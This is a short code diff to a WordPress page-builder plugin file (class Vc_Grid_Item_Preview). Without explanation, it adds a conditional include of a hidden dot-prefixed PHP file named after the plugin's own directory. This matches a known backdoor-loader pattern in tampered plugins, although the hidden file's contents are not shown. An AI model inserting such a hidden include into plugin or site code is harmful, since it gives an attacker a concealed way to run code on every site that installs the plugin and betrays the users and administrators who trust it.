@@ -6,6 +6,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 /**
  * Class Vc_Grid_Item_Preview
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Grid_Item_Preview {
 	protected $shortcodes_string = '';
 	protected $post_id = false;
